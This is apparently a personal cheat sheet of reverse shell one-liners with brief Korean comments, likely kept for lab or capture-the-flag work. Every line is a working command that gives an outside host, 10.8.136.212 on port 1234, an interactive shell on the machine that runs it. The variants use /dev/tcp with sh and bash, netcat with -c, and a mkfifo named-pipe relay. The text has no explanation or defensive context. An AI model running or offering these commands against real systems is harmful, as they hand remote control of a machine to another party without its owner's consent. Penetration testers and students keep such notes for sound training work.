sh -i >& /dev/tcp/10.8.136.212/1234 0>&1
nc -c sh 10.8.136.212 1234

# 일반적인 bash

bash -i >& /dev/tcp/10.8.136.212/1234 0>&1
/bin/sh -i >& /dev/tcp/10.8.136.212/1234 0>&1

# 안전한 named pipe 방식 선호

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.136.212 1234 >/tmp/f
